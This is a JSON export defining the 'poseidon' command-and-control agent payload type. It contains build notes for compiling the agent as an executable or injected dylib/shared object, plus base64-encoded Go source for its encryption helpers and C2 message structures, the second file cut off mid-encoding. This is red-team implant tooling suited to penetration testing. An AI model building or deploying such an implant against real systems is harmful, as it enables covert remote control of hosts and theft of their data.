{
  "payload_types": [
    {
      "wrapper": false,
      "command_template": "\n",
      "supported_os": "linux (x86),linux (x64),macOS (x86),macOS (x64)",
      "execute_help": "\nExecutable - The poseidon macho or elf file can be executed from the command line\nShared Object\/Dylib - The poseidon c-archive package contains an export, \"RunMain\" that is called by the main c code in sharedlib-darwin-linux.c when the dylib is loaded into process memory. ",
      "external": false,
      "container_running": true,
      "service": "rabbitmq",
      "author": "@xorrior, @djhohnstein",
      "note": "This payload type uses golang to cross-compile into various platforms with the help of cgo and xgo\n\nThere are two options for file types when building a poseidon payload\n- The default option produces an executable for the selected operating system\n- The c-archive option produces an archive file that can be used with sharedlib-darwin-linux.c to compile a shared object file for Linux or dylib for macOS.\n\nBuilding a SO\/Dylib File\n- In the payload type information section of the payload creation page, please select the c-archive buildmode option.\n- The resulting payload file should be a zip archive. This contains the golang archive file and header for poseidon. Copy the sharedlib-darwin-linux.c file to the folder with the golang archive files. \n- Edit sharedlib-darwin-linux.c and change the include statement on line 7 to match the name of the golang archive header file.\n- Use clang to compile a dylib on macOS: clang -shared -framework Foundation -framework CoreGraphics -framework Security -fpic sharedlib-darwin-linux.c golangarchive.a -o payload.dylib\n- Note you may need to execute ranlib against the archive file before compiling.",
      "supports_dynamic_loading": false,
      "deleted": false,
      "last_heartbeat": "03\/20\/2020 01:13:20",
      "ptype": "poseidon",
      "file_extension": "go",
      "wrapped_payload_type": "null",
      "icon": null,
      "files": [
        {
          "pkg\/utils\/crypto\/crypto.go": "cGFja2FnZSBjcnlwdG8KCmltcG9ydCAoCgkiYnl0ZXMiCgkiY3J5cHRvL2FlcyIKCSJjcnlwdG8vY2lwaGVyIgoJImNyeXB0by9obWFjIgoJImNyeXB0by9yYW5kIgoJImNyeXB0by9yc2EiCgkiY3J5cHRvL3NoYTEiCgkiY3J5cHRvL3NoYTI1NiIKCSJjcnlwdG8veDUwOSIKCSJlbmNvZGluZy9oZXgiCgkiZW5jb2RpbmcvcGVtIgoJImVycm9ycyIKCSJpbyIKCSJsb2ciCikKCi8vIFBLQ1M3IGVycm9ycy4KdmFyICgKCS8vIEVyckludmFsaWRCbG9ja1NpemUgaW5kaWNhdGVzIGhhc2ggYmxvY2tzaXplIDw9IDAuCglFcnJJbnZhbGlkQmxvY2tTaXplID0gZXJyb3JzLk5ldygiaW52YWxpZCBibG9ja3NpemUiKQoKCS8vIEVyckludmFsaWRQS0NTN0RhdGEgaW5kaWNhdGVzIGJhZCBpbnB1dCB0byBQS0NTNyBwYWQgb3IgdW5wYWQuCglFcnJJbnZhbGlkUEtDUzdEYXRhID0gZXJyb3JzLk5ldygiaW52YWxpZCBQS0NTNyBkYXRhIChlbXB0eSBvciBub3QgcGFkZGVkKSIpCgoJLy8gRXJySW52YWxpZFBLQ1M3UGFkZGluZyBpbmRpY2F0ZXMgUEtDUzcgdW5wYWQgZmFpbHMgdG8gYmFkIGlucHV0LgoJRXJySW52YWxpZFBLQ1M3UGFkZGluZyA9IGVycm9ycy5OZXcoImludmFsaWQgcGFkZGluZyBvbiBpbnB1dCIpCikKCmZ1bmMgR2VuZXJhdGVSU0FLZXlQYWlyKCkgKFtdYnl0ZSwgKnJzYS5Qcml2YXRlS2V5KSB7CglzZXJ2ZXJQcml2S2V5LCBlcnIgOj0gcnNhLkdlbmVyYXRlS2V5KHJhbmQuUmVhZGVyLCA0MDk2KQoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50bG4oZXJyLkVycm9yKCkpCgkJcmV0dXJuIG5pbCwgbmlsCgl9CgoJc2VydmVyUHViS2V5IDo9ICZzZXJ2ZXJQcml2S2V5LlB1YmxpY0tleQoKCS8vcmV0dXJuIGJvdGgga2V5cwoKCXB1YkFTTjEgOj0geDUwOS5NYXJzaGFsUEtDUzFQdWJsaWNLZXkoc2VydmVyUHViS2V5KQoJcHViUGVtIDo9IHBlbS5FbmNvZGVUb01lbW9yeSgKCQkmcGVtLkJsb2NrewoJCQlUeXBlOiAgIlJTQSBQVUJMSUMgS0VZIiwKCQkJQnl0ZXM6IHB1YkFTTjEsCgkJfSwKCSkKCglyZXR1cm4gcHViUGVtLCBzZXJ2ZXJQcml2S2V5Cn0KCmZ1bmMgUnNhRGVjcnlwdENpcGhlckJ5dGVzKGVuY3J5cHRlZERhdGEgW11ieXRlLCBwcml2YXRlS2V5ICpyc2EuUHJpdmF0ZUtleSkgW11ieXRlIHsKCS8vbG9nLlByaW50bG4oIkluIFJzYURlY3J5cHRDaXBoZXJCeXRlcyIpCgoJaGFzaCA6PSBzaGExLk5ldygpCgkvL2RlY3J5cHRlZERhdGEsIGVyciA6PSByc2EuRGVjcnlwdE9BRVAoaGFzaCwgcmFuZC5SZWFkZXIsIHByaXZhdGVLZXksIGVuY3J5cHRlZERhdGEsIG5pbCkKCS8vbG9nLlByaW50bG4oIkVuY3J5cHRlZCBkYXRhIHNpemU6ICIsIGxlbihlbmNyeXB0ZWREYXRhKSkKCglkZWNyeXB0ZWREYXRhLCBlcnIgOj0gcnNhLkRlY3J5cHRPQUVQKGhhc2gsIHJhbmQuUmVhZGVyLCBwcml2YXRlS2V5LCBlbmNyeXB0ZWREYXRhLCBuaWwpCgkvL2RlY3J5cHRlZERhdGEsIGVyciA6PSByc2EuRGVjcnlwdFBLQ1MxdjE1KHJhbmQuUmVhZGVyLCBwcml2YXRlS2V5LCBlbmNyeXB0ZWREYXRhKQoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRsbigiRmFpbGVkIHRvIGRlY3J5cHQgZGF0YSB3aXRoOiAiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gbWFrZShbXWJ5dGUsIDApCgl9CgoJcmV0dXJuIGRlY3J5cHRlZERhdGEKfQoKZnVuYyBSc2FFbmNyeXB0Qnl0ZXMocGxhaW5CeXRlcyBbXWJ5dGUsIHB1YmxpY0tleSBbXWJ5dGUpIFtdYnl0ZSB7CglwdWJLZXksIGVyciA6PSB4NTA5LlBhcnNlUEtDUzFQdWJsaWNLZXkocHVibGljS2V5KQoJaWYgZXJyICE9IG5pbCB7CgkJLy9sb2cuUHJpbnRsbigiRXJyb3IgZW5jcnlwdGluZyBieXRlczogIiwgZXJyKQoJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCX0KCgloYXNoIDo9IHNoYTEuTmV3KCkKCWVuY3J5cHRlZERhdGEsIF8gOj0gcnNhLkVuY3J5cHRPQUVQKGhhc2gsIHJhbmQuUmVhZGVyLCBwdWJLZXksIHBsYWluQnl0ZXMsIG5pbCkKCWlmIGVyciAhPSBuaWwgewoJCS8vbG9nLlByaW50bG4oIlVuYWJsZSB0byBlbmNyeXB0ICIsIGRlY0VycikKCQlyZXR1cm4gbWFrZShbXWJ5dGUsIDApCgl9CgoJcmV0dXJuIGVuY3J5cHRlZERhdGEKfQoKLy8gaHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vbWlja2Vsc29ubS9lMWJmMzY1YTE0OWYzZmU1OTExOQoKZnVuYyBBZXNFbmNyeXB0KGtleSBbXWJ5dGUsIHBsYWluQnl0ZXMgW11ieXRlKSBbXWJ5dGUgewoJYmxvY2ssIGVyciA6PSBhZXMuTmV3Q2lwaGVyKGtleSkKCWlmIGVyciAhPSBuaWwgewoJCWxvZy5QcmludGxuKCJLZXkgZXJyb3I6ICIsIGVyci5FcnJvcigpKQoJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCX0KCglpdiA6PSBtYWtlKFtdYnl0ZSwgYWVzLkJsb2NrU2l6ZSkKCWlmIF8sIGVyciA9IGlvLlJlYWRGdWxsKHJhbmQuUmVhZGVyLCBpdik7IGVyciAhPSBuaWwgewoJCWxvZy5QcmludGxuKGVyci5FcnJvcigpKQoJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCX0KCgljYmMgOj0gY2lwaGVyLk5ld0NCQ0VuY3J5cHRlcihibG9jaywgaXYpCglwbGFpbkJ5dGVzLCBfID0gcGtjczdQYWQocGxhaW5CeXRlcywgYWVzLkJsb2NrU2l6ZSkKCWVuY0J5dGVzIDo9IG1ha2UoW11ieXRlLCBsZW4ocGxhaW5CeXRlcykpCgoJY2JjLkNyeXB0QmxvY2tzKGVuY0J5dGVzLCBwbGFpbkJ5dGVzKQoJZW5jcnlwdGVkQnlwdGVzIDo9IGFwcGVuZChpdiwgZW5jQnl0ZXMuLi4pICAgICAgICAgICAgICAgICAgIC8vIElWICsgQ2lwaGVydGV4dAoJaCA6PSBobWFjLk5ldyhzaGEyNTYuTmV3LCBrZXkpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE5ldyBobWFjIHdpdGgga2V5CgloLldyaXRlKGVuY3J5cHRlZEJ5cHRlcykgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gV3JpdGUgYnl0ZXMgdG8gaG1hYwoJaG1hY0VuY3J5cHRlZEJ5dGVzIDo9IGFwcGVuZChlbmNyeXB0ZWRCeXB0ZXMsIGguU3VtKG5pbCkuLi4pIC8vIElWICsgQ2lwaGVydGV4dCArIGhtYWMKCXJldHVybiBobWFjRW5jcnlwdGVkQnl0ZXMKfQoKLy9BZXNEZWNyeXB0IC0gRGVjcnlwdCBBRVMgZW5jcnlwdGVkIGRhdGEgd2l0aCB0aGUga2V5CmZ1bmMgQWVzRGVjcnlwdChrZXkgW11ieXRlLCBlbmNyeXB0ZWRCeXRlcyBbXWJ5dGUpIFtdYnl0ZSB7CgkvLyBUT0RPOiBDaGFuZ2UgdGhlIHJldHVybiB0eXBlIHRvIGFsbG93IGZvciByZXR1cm5pbmcgZXJyb3IgbWVzc2FnZXMKCWJsb2NrLCBlcnIgOj0gYWVzLk5ld0NpcGhlcihrZXkpCglpZiBlcnIgIT0gbmlsIHsKCQlsb2cuUHJpbnRsbigiS2V5IGVycm9yOiAiLCBlcnIpCgkJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQoJfQoKCWlmIGxlbihlbmNyeXB0ZWRCeXRlcykgPCBhZXMuQmxvY2tTaXplIHsKCQlsb2cuUHJpbnRsbigiQ2lwaGVydGV4dCB0b28gc2hvcnQiKQoJCXJldHVybiBtYWtlKFtdYnl0ZSwgMCkKCX0KCglpdiA6PSBlbmNyeXB0ZWRCeXRlc1s6YWVzLkJsb2NrU2l6ZV0gICAgICAgICAgICAgICAgICAgIC8vIGdldHMgSVYsIGJ5dGVzIDAgLSAxNgoJaG1hY0hhc2ggOj0gZW5jcnlwdGVkQnl0ZXNbKGxlbihlbmNyeXB0ZWRCeXRlcykgLSAzMik6XSAvLyBnZXRzIHRoZSBobWFjLCB0aGUgbGFzdCAzMiBieXRlcyBvZiB0aGUgYXJyYXkKCWVuY3J5cHRlZFBvcnRpb24gOj0gZW5jcnlwdGVkQnl0ZXNbYWVzLkJsb2NrU2l6ZToobGVuKGVuY3J5cHRlZEJ5dGVzKSAtIDMyKV0KCWggOj0gaG1hYy5OZXcoc2hhMjU2Lk5ldywga2V5KQoJaC5Xcml0ZShlbmNyeXB0ZWRCeXRlc1s6KGxlbihlbmNyeXB0ZWRCeXRlcykgLSAzMildKQoJdmVyaWZpZWQgOj0gaG1hYy5FcXVhbChoLlN1bShuaWwpLCBobWFjSGFzaCkKCWlmIHZlcmlmaWVkICE9IHRydWUgewoJCWdlbiA6PSBoZXguRW5jb2RlVG9TdHJpbmcoaC5TdW0obmlsKSkKCQlyZWNlaXZlZCA6PSBoZXguRW5jb2RlVG9TdHJpbmcoaG1hY0hhc2gpCgkJbG9nLlByaW50ZigiSE1BQyB2ZXJpZmljYXRpb24gZmFpbGVkXG4gUmVjZWl2ZWQgSE1BQzogJXNcbiBHZW5lcmF0ZWQgSE1BQzogJXNcbiIsIHJlY2VpdmVkLCBnZW4pCgkJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQoJfQoKCWlmIGxlbihlbmNyeXB0ZWRQb3J0aW9uKSVhZXMuQmxvY2tTaXplICE9IDAgewoJCWxvZy5QcmludGxuKCJjaXBoZXJ0ZXh0IG5vdCBhIG11aWx0aXBsZSBvZiB0aGUgYmxvY2sgc2l6ZSIpCgkJcmV0dXJuIG1ha2UoW11ieXRlLCAwKQoJfQoJbW9kZSA6PSBjaXBoZXIuTmV3Q0JDRGVjcnlwdGVyKGJsb2NrLCBpdikKCgl1bkVuY3J5cHRlZEJ5dGVzIDo9IG1ha2UoW11ieXRlLCBsZW4oZW5jcnlwdGVkUG9ydGlvbikpCgltb2RlLkNyeXB0QmxvY2tzKHVuRW5jcnlwdGVkQnl0ZXMsIGVuY3J5cHRlZFBvcnRpb24pCglkYXRhLCBlcnIgOj0gcGtjczdVbnBhZCh1bkVuY3J5cHRlZEJ5dGVzLCBhZXMuQmxvY2tTaXplKQoJaWYgZXJyICE9IG5pbCB7CgkJbG9nLlByaW50ZigicGFkZGluZyBlcnJvcjogJXMiLCBlcnIuRXJyb3IoKSkKCQlyZXR1cm4gbWFrZShbXWJ5dGUsIDApCgl9CglyZXR1cm4gZGF0YQoKfQoKLy8gcGtjczdQYWQgcmlnaHQtcGFkcyB0aGUgZ2l2ZW4gYnl0ZSBzbGljZSB3aXRoIDEgdG8gbiBieXRlcywgd2hlcmUKLy8gbiBpcyB0aGUgYmxvY2sgc2l6ZS4gVGhlIHNpemUgb2YgdGhlIHJlc3VsdCBpcyB4IHRpbWVzIG4sIHdoZXJlIHgKLy8gaXMgYXQgbGVhc3QgMS4KZnVuYyBwa2NzN1BhZChiIFtdYnl0ZSwgYmxvY2tzaXplIGludCkgKFtdYnl0ZSwgZXJyb3IpIHsKCWlmIGJsb2Nrc2l6ZSA8PSAwIHsKCQlyZXR1cm4gbmlsLCBFcnJJbnZhbGlkQmxvY2tTaXplCgl9CglpZiBiID09IG5pbCB8fCBsZW4oYikgPT0gMCB7CgkJcmV0dXJuIG5pbCwgRXJySW52YWxpZFBLQ1M3RGF0YQoJfQoJbiA6PSBibG9ja3NpemUgLSAobGVuKGIpICUgYmxvY2tzaXplKQoJcGIgOj0gbWFrZShbXWJ5dGUsIGxlbihiKStuKQoJY29weShwYiwgYikKCWNvcHkocGJbbGVuKGIpOl0sIGJ5dGVzLlJlcGVhdChbXWJ5dGV7Ynl0ZShuKX0sIG4pKQoJcmV0dXJuIHBiLCBuaWwKfQoKLy8gcGtjczdVbnBhZCB2YWxpZGF0ZXMgYW5kIHVucGFkcyBkYXRhIGZyb20gdGhlIGdpdmVuIGJ5dGVzIHNsaWNlLgovLyBUaGUgcmV0dXJuZWQgdmFsdWUgd2lsbCBiZSAxIHRvIG4gYnl0ZXMgc21hbGxlciBkZXBlbmRpbmcgb24gdGhlCi8vIGFtb3VudCBvZiBwYWRkaW5nLCB3aGVyZSBuIGlzIHRoZSBibG9jayBzaXplLgpmdW5jIHBrY3M3VW5wYWQoYiBbXWJ5dGUsIGJsb2Nrc2l6ZSBpbnQpIChbXWJ5dGUsIGVycm9yKSB7CglpZiBibG9ja3NpemUgPD0gMCB7CgkJcmV0dXJuIG5pbCwgRXJySW52YWxpZEJsb2NrU2l6ZQoJfQoJaWYgYiA9PSBuaWwgfHwgbGVuKGIpID09IDAgewoJCXJldHVybiBuaWwsIEVyckludmFsaWRQS0NTN0RhdGEKCX0KCWlmIGxlbihiKSVibG9ja3NpemUgIT0gMCB7CgkJcmV0dXJuIG5pbCwgRXJySW52YWxpZFBLQ1M3UGFkZGluZwoJfQoJYyA6PSBiW2xlbihiKS0xXQoJbiA6PSBpbnQoYykKCWlmIG4gPT0gMCB8fCBuID4gbGVuKGIpIHsKCQlyZXR1cm4gbmlsLCBFcnJJbnZhbGlkUEtDUzdQYWRkaW5nCgl9Cglmb3IgaSA6PSAwOyBpIDwgbjsgaSsrIHsKCQlpZiBiW2xlbihiKS1uK2ldICE9IGMgewoJCQlyZXR1cm4gbmlsLCBFcnJJbnZhbGlkUEtDUzdQYWRkaW5nCgkJfQoJfQoJcmV0dXJuIGJbOmxlbihiKS1uXSwgbmlsCn0KCmZ1bmMgcEtDUzVQYWRkaW5nKGNpcGhlcnRleHQgW11ieXRlLCBibG9ja1NpemUgaW50KSBbXWJ5dGUgewoJcGFkZGluZyA6PSBibG9ja1NpemUgLSBsZW4oY2lwaGVydGV4dCklYmxvY2tTaXplCglwYWR0ZXh0IDo9IGJ5dGVzLlJlcGVhdChbXWJ5dGV7Ynl0ZShwYWRkaW5nKX0sIHBhZGRpbmcpCglyZXR1cm4gYXBwZW5kKGNpcGhlcnRleHQsIHBhZHRleHQuLi4pCn0KCmZ1bmMgcEtDUzVUcmltbWluZyhlbmNyeXB0IFtdYnl0ZSkgW11ieXRlIHsKCXBhZGRpbmcgOj0gZW5jcnlwdFtsZW4oZW5jcnlwdCktMV0KCXJldHVybiBlbmNyeXB0WzpsZW4oZW5jcnlwdCktaW50KHBhZGRpbmcpXQp9Cg=="
        },
        {
          "pkg\/utils\/structs\/definitions.go": "cGFja2FnZSBzdHJ1Y3RzCgppbXBvcnQgKAoJImVuY29kaW5nL2pzb24iCgkibG9nIgoJInRpbWUiCikKCi8vIERlZmF1bHRjb25maWcgLSBDMiBQcm9maWxlIGNvbmZpZ3VyYXRpb24gZm9yIHRoZSBkZWZhdWx0IHByb2ZpbGUKdHlwZSBEZWZhdWx0Y29uZmlnIHN0cnVjdCB7CglLRVlYICAgICAgIHN0cmluZyAgIGBqc29uOiJrZXl4ImAKCUtleSAgICAgc3RyaW5nICAgYGpzb246ImtleSJgCglCYXNlVVJMICAgIHN0cmluZyAgIGBqc29uOiJiYXNldXJsImAKCVVzZXJBZ2VudCAgc3RyaW5nICAgYGpzb246InVzZXJhZ2VudCJgCglTbGVlcCAgICAgIGludCAgIGBqc29uOiJzbGVlcCJgCglIb3N0SGVhZGVyIHN0cmluZyAgIGBqc29uOiJob3N0aGVhZGVyImAKCUppdHRlciAgICAgaW50ICAgICAgYGpzb246ImppdHRlciJgCn0KCi8vIFdlYnNvY2tldGNvbmZpZyAtIEMyIFByb2ZpbGUgY29uZmlndXJhdGlvbiBmb3IgdGhlIHdlYnNvY2tldCBwcm9maWxlCnR5cGUgV2Vic29ja2V0Y29uZmlnIHN0cnVjdCB7CglLRVlYICAgICAgIHN0cmluZyAgIGBqc29uOiJrZXl4ImAKCUtleSAgICAgc3RyaW5nICAgYGpzb246ImtleSJgCglCYXNlVVJMICAgIHN0cmluZyAgIGBqc29uOiJiYXNldXJsImAKCVVzZXJBZ2VudCAgc3RyaW5nICAgYGpzb246InVzZXJhZ2VudCJgCglTbGVlcCAgICAgIGludCAgIGBqc29uOiJzbGVlcCJgCglIb3N0SGVhZGVyIHN0cmluZyAgIGBqc29uOiJob3N0aGVhZGVyImAKCUppdHRlciAgICAgaW50ICAgICAgYGpzb246ImppdHRlciJgCglFbmRwb2ludCAgIHN0cmluZyAgIGBqc29uOiJlbmRwb2ludCJgCn0KCi8vIFNsYWNrY29uZmlnIC0gQzIgUHJvZmlsZSBjb25maWd1cmF0aW9uIGZvciB0aGUgc2xhY2sgcHJvZmlsZQp0eXBlIFNsYWNrY29uZmlnIHN0cnVjdCB7CglLRVlYICAgICAgIHN0cmluZyAgIGBqc29uOiJrZXl4ImAKCUtleSAgICAgc3RyaW5nICAgYGpzb246ImtleSJgCglTbGVlcCAgICAgIGludCAgIGBqc29uOiJzbGVlcCJgCglKaXR0ZXIgICAgIGludCAgICAgIGBqc29uOiJqaXR0ZXIiYAoJQXBpS2V5CSAgc3RyaW5nIAlganNvbjoiYXBpa2V5ImAKCUNoYW5uZWxJRCBzdHJpbmcgCWBqc29uOiJjaGFubmVsaWQiYAp9CgovLyBTdHJ1Y3QgZGVmaW5pdGlvbiBmb3IgQ2hlY2tJbiBtZXNzYWdlcwp0eXBlIENoZWNrSW5NZXNzYWdlIHN0cnVjdCB7CglBY3Rpb24gICAgICAgICBzdHJpbmcgYGpzb246ImFjdGlvbiJgCglJUCAgICAgICAgICAgICBzdHJpbmcgYGpzb246ImlwImAKCU9TICAgICAgICAgICAgIHN0cmluZyBganNvbjoib3MiYAoJVXNlciAgICAgICAgICAgc3RyaW5nIGBqc29uOiJ1c2VyImAKCUhvc3QgICAgICAgICAgIHN0cmluZyBganNvbjoiaG9zdCJgCglQaWQgICAgICAgICAgICBpbnQgICAgYGpzb246InBpZCJgCglVVUlEICAgICAgICAgICBzdHJpbmcgYGpzb246InV1aWQiYAoJQXJjaGl0ZWN0dXJlICAgc3RyaW5nIGBqc29uOiJhcmNoaXRlY3R1cmUiYAoJRG9tYWluICAgICAgICAgc3RyaW5nIGBqc29uOiJkb21haW4iYAoJSW50ZWdyaXR5TGV2ZWwgaW50ICAgIGBqc29uOiJpbnRlZ3JpdHlfbGV2ZWwiYAoJRXh0ZXJuYWxJUCAgICAgc3RyaW5nIGBqc29uOiJleHRlcm5hbF9pcCJgCglFbmNyeXB0aW9uS2V5ICBzdHJpbmcgYGpzb246ImVuY3J5cHRpb25fa2V5ImAKCURlY3J5cHRpb25LZXkgIHN0cmluZyBganNvbjoiZGVjcnlwdGlvbl9rZXkiYAp9Cgp0eXBlIENoZWNrSW5NZXNzYWdlUmVzcG9uc2Ugc3RydWN0IHsKCUFjdGlvbiBzdHJpbmcgYGpzb246ImFjdGlvbiJgCglJRCAgICAgc3RyaW5nIGBqc29uOiJpZCJgCglTdGF0dXMgc3RyaW5nIGBqc29uOiJzdGF0dXMiYAp9CgovLyBTdHJ1Y3QgZGVmaW5pdGlvbnMgZm9yIEVLRS1SU0EgbWVzc2FnZXMKCnR5cGUgRWtlS2V5RXhjaGFuZ2VNZXNzYWdlIHN0cnVjdCB7CglBY3Rpb24gICAgc3RyaW5nIGBqc29uOiJhY3Rpb24iYAoJUHViS2V5ICAgIHN0cmluZyBganNvbjoicHViX2tleSJgCglTZXNzaW9uSUQgc3RyaW5nIGBqc29uOiJzZXNzaW9uX2lkImAKfQoKdHlwZSBFa2VLZXlFeGNoYW5nZU1lc3NhZ2VSZXNwb25zZSBzdHJ1Y3QgewoJQWN0aW9uICAgICBzdHJpbmcgYGpzb246ImFjdGlvbiJgCglVVUlEICAgICAgIHN0cmluZyBganNvbjoidXVpZCJgCglTZXNzaW9uS2V5IHN0cmluZyBganNvbjoic2Vzc2lvbl9rZXkiYAoJU2Vzc2lvbklkICBzdHJpbmcgYGpzb246InNlc3Npb25faWQiYAp9CgovLyBTdHJ1Y3QgZGVmaW5pdGlvbnMgZm9yIFRhc2tpbmcgcmVxdWVzdCBtZXNzYWdlcwoKdHlwZSBUYXNrUmVxdWVzdE1lc3NhZ2Ugc3RydWN0IHsKCUFjdGlvbiAgICAgIHN0cmluZyAgICAgICAgICAgICBganNvbjoiYWN0aW9uImAKCVRhc2tpbmdTaXplIGludCAgICAgICAgICAgICAgICBganNvbjoidGFza2luZ19zaXplImAKCURlbGVnYXRlcyAgIFtdKmpzb24uUmF3TWVzc2FnZSBganNvbjoiZGVsZWdhdGVzImAKfQoKdHlwZSBUYXNrUmVxdWVzdE1lc3NhZ2VSZXNwb25zZSBzdHJ1Y3QgewoJQWN0aW9uICAgIHN0cmluZyAgICAgICAgICAgICBganNvbjoiYWN0aW9uImAKCVRhc2tzICAgICBbXVRhc2sgICAgICAgICAgICAgYGpzb246InRhc2tzImAKCURlbGVnYXRlcyBbXSpqc29uLlJhd01lc3NhZ2UgYGpzb246ImRlbGVnYXRlcyJgCn0KCnR5cGUgVGFzayBzdHJ1Y3QgewoJQ29tbWFuZCAgIHN0cmluZyAgYGpzb246ImNvbW1hbmQiYAoJUGFyYW1zICAgIHN0cmluZyAgYGpzb246InBhcmFtZXRlcnMiYAoJVGltZXN0YW1wIGZsb2F0NjQgYGpzb246InRpbWVzdGFtcCJgCglUYXNrSUQgICAgc3RyaW5nICBganNvbjoiaWQiYAoJSm9iICAgICAgICpKb2IKfQoKdHlwZSBKb2Igc3RydWN0IHsKCUtpbGxDaGFubmVsIGNoYW4gKGludCkKCVN0b3AgICAgICAgICppbnQKCU1vbml0b3JpbmcgIGJvb2wKfQoKLy8gU3RydWN0IGRlZmluaXRpb25zIGZvciBUYXNrUmVzcG9uc2UgTWVzc2FnZXMKdHlwZSBUYXNrUmVzcG9uc2VNZXNzYWdlIHN0cnVjdCB7CglBY3Rpb24gICAgc3RyaW5nICAgICAgICAgICAgYGpzb246ImFjdGlvbiJgCglSZXNwb25zZXMgW11qc29uLlJhd01lc3NhZ2UgYGpzb246InJlc3BvbnNlcyJgCglEZWxlZ2F0ZXMgW11qc29uLlJhd01lc3NhZ2UgYGpzb246ImRlbGVnYXRlcyJgCn0KCnR5cGUgUmVzcG9uc2Ugc3RydWN0IHsKCVRhc2tJRCAgICAgc3RyaW5nIGBqc29uOiJ0YXNrX2lkImAKCVVzZXJPdXRwdXQgc3RyaW5nIGBqc29uOiJ1c2VyX291dHB1dCJgCglDb21wbGV0ZWQgIGJvb2wgICBganNvbjoiY29tcGxldGVkImAKCVN0YXR1cyAgICAgc3RyaW5nIGBqc29uOiJzdGF0dXMiYAp9Cgp0eXBlIFRhc2tSZXNwb25zZU1lc3NhZ2VSZXNwb25zZSBzdHJ1Y3QgewoJQWN0aW9uICAgIHN0cmluZyAgICAgICAgICAgIGBqc29uOiJhY3Rpb24iYAoJUmVzcG9uc2VzIFtdanNvbi5SYXdNZXNzYWdlIGBqc29uOiJyZXNwb25zZXMiYAoJRGVsZWdhdGVzIFtdanNvbi5SYXdNZXNzYWdlIGBqc29uOiJkZWxlZ2F0ZXMiYAp9Cgp0eXBlIFNlcnZlclJlc3BvbnNlIHN0cnVjdCB7CglUYXNrSUQgc3RyaW5nIGBqc29uOiJ1dWlkImAKCVN0YXR1cyBzdHJpbmcgYGpzb246InN0YXR1cyJgCglFcnJvciAgc3RyaW5nIGBqc29uOiJlcnJvciJgCn0KCnR5cGUgVXNlck91dHB1dCBzdHJ1Y3QgewoJT3V0cHV0IFtdYnl0ZSBganNvbjoidXNlcl9vdXRwdXQiYAp9CgovLyBTdHJ1Y3QgZGVmaW5pdGlvbnMgZm9yIGZpbGUgZG93bmxvYWRzIGFuZCB1cGxvYWRzCnR5cGUgRmlsZURvd25sb2FkSW5pdGlhbE1lc3NhZ2Ugc3RydWN0IHsKCU51bUNodW5rcyBpbnQgICAgYGpzb246InRvdGFsX2NodW5rcyJgCglUYXNrSUQgICAgc3RyaW5nIGBqc29uOiJ0YXNrX2lkImAKCUZ1bGxQYXRoICBzdHJpbmcgYGpzb246ImZ1bGxfcGF0aCJgCn0KCnR5cGUgRmlsZURvd25sb2FkSW5pdGlhbE1lc3NhZ2VSZXNwb25zZSBzdHJ1Y3QgewoJU3RhdHVzIHN0cmluZyBganNvbjoic3RhdHVzImAKCUZpbGVJRCBzdHJpbmcgYGpzb246ImZpbGVfaWQiYAp9Cgp0eXBlIEZpbGVEb3dubG9hZENodW5rTWVzc2FnZSBzdHJ1Y3QgewoJQ2h1bmtOdW0gIGludCAgICBganNvbjoiY2h1bmtfbnVtImAKCUZpbGVJRCAgICBzdHJpbmcgYGpzb246ImZpbGVfaWQiYAoJQ2h1bmtEYXRhIHN0cmluZyBganNvbjoiY2h1bmtfZGF0YSJgCglUYXNrSUQgICAgc3RyaW5nIGBqc29uOiJ0YXNrX2lkImAKfQoKdHlwZSBGaWxlVXBsb2FkQ2h1bmtNZXNzYWdlIHN0cnVjdCB7CglBY3Rpb24gICAgc3RyaW5nIGBqc29uOiJhY3Rpb24iYAoJQ2h1bmtTaXplIGludCAgICBganNvbjoiY2h1bmtfc2l6ZSJgCglGaWxlSUQgICAgc3RyaW5nIGBqc29uOiJmaWxlX2lkImAKCUNodW5rTnVtICBpbnQgICAgYGpzb246ImNodW5rX251bSJgCglGdWxsUGF0aCAgc3RyaW5nIGBqc29uOiJmdWxsX3BhdGgiYAoJVGFza0lEIHN0cmluZyBganNvbjoidGFza19pZCJgCn0KCnR5cGUgRmlsZVVwbG9hZENodW5rTWVzc2FnZVJlc3BvbnNlIHN0cnVjdCB7CglBY3Rpb24gICAgICBzdHJpbmcgYGpzb246ImFjdGlvbiJgCglUb3RhbENodW5rcyBpbnQgICAgYGpzb246InRvdGFsX2NodW5rcyJgCglDaHVua051bSAgICBpbnQgICAgYGpzb246ImNodW5rX251bSJgCglDaHVua0RhdGEgICBzdHJpbmcgYGpzb246ImNodW5rX2RhdGEiYAogICAgRmlsZUlEICAgIHN0cmluZyBganNvbjoiZmlsZV9pZCJgCn0KCi8vTWVzc2FnZSAtIHN0cnVjdCBkZWZpbml0aW9uIGZvciBleHRlcm5hbCBDMiBtZXNzYWdlcwp0eXBlIE1lc3NhZ2Ugc3RydWN0IHsKCVRhZyAgICBzdHJpbmcgYGpzb246InRhZyJgCglDbGllbnQgYm9vbCAgIGBqc29uOiJjbGllbnQiYAoJRGF0YSAgIHN0cmluZyBganNvbjoiZGF0YSJgCn0KCi8vVGhyZWFkTXNnIHVzZWQgdG8gc2VuZCB0YXNrIHJlc3VsdHMgYmFjayB0byB0aGUgcmVjZWl2aW5nIGNoYW5uZWwKdHlwZSBUaHJlYWRNc2cgc3RydWN0IHsKCVRhc2tJdGVtICAgVGFzawoJVGFza1Jlc3VsdCBbXWJ5dGUKCUVycm9yICAgICAgYm9vbAoJQ29tcGxldGVkICBib29sCn0KCi8vIFRhc2tTdHViIHRvIHBvc3QgbGlzdCBvZiBjdXJyZW50bHkgcHJvY2Vzc2luZyB0YXNrcy4KdHlwZSBUYXNrU3R1YiBzdHJ1Y3QgewoJQ29tbWFuZCBzdHJpbmcgYGpzb246ImNvbW1hbmQiYAoJUGFyYW1zICBzdHJpbmcgYGpzb246InBhcmFtcyJgCglJRCAgICAgIHN0cmluZyBganNvbjoiaWQiYAp9CgovLyBKb2Igc3RydWN0IHRoYXQgd2lsbCBsaXN0